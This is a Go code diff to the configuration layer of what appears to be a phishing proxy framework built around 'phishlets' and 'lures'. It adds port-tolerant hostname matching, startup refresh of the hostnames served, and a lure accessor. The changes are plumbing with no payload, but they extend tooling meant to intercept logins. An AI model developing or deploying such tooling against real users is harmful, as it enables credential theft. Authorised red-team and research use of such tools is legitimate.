@@ -79,6 +79,7 @@ type Config struct {
 	phishlets       map[string]*Phishlet
 	phishletNames   []string
 	activeHostnames []string
+	portTolerance   bool
 	redirectorsDir  string
 	lures           []*Lure
 	lureIds         []string
@@ -291,6 +292,19 @@ func (c *Config) SetDnsPort(port int) {
 	c.cfg.WriteConfig()
 }
 
+func (c *Config) PortTolerance() bool {
+	return c.portTolerance
+}
+
+func (c *Config) SetPortTolerance(enabled bool) {
+	c.portTolerance = enabled
+	if enabled {
+		log.Info("port tolerance is now enabled")
+	} else {
+		log.Info("port tolerance is now disabled")
+	}
+}
+
 func (c *Config) EnableProxy(enabled bool) {
 	c.proxyConfig.Enabled = enabled
 	c.cfg.Set(CFG_PROXY, c.proxyConfig)
@@ -343,6 +357,9 @@ func (c *Config) SetProxyPassword(password string) {
 }
 
 func (c *Config) IsLureHostnameValid(hostname string) bool {
+	if c.portTolerance {
+		hostname = stripHostPort(hostname)
+	}
 	for _, l := range c.lures {
 		if l.Hostname == hostname {
 			if c.PhishletConfig(l.Phishlet).Enabled {
@@ -479,6 +496,14 @@ func (c *Config) refreshActiveHostnames() {
 	}
 }
 
+// RefreshActiveHostnames rebuilds the in-memory list of hostnames the proxy
+// will serve, from the phishlets that are currently enabled (and any lures
+// with their own hostnames). Call once at startup so that phishlets persisted
+// as enabled on disk are served immediately, without requiring a GUI toggle.
+func (c *Config) RefreshActiveHostnames() {
+	c.refreshActiveHostnames()
+}
+
 func (c *Config) GetActiveHostnames(site string) []string {
 	var ret []string
 	sites := c.GetEnabledSites()
@@ -506,6 +531,9 @@ func (c *Config) GetActiveHostnames(site string) []string {
 
 func (c *Config) IsActiveHostname(host string) bool {
 	host = strings.ToLower(host)
+	if c.portTolerance {
+		host = stripHostPort(host)
+	}
 	if host[len(host)-1:] == "." {
 		host = host[:len(host)-1]
 	}
@@ -698,6 +726,10 @@ func (c *Config) GetLure(index int) (*Lure, error) {
 	} else {
 		return nil, fmt.Errorf("index out of bounds: %d", index)
 	}
+}
+
+func (c *Config) GetLures() []*Lure {
+	return c.lures
 }
 
 func (c *Config) GetLureByPath(site string, host string, path string) (*Lure, error) {
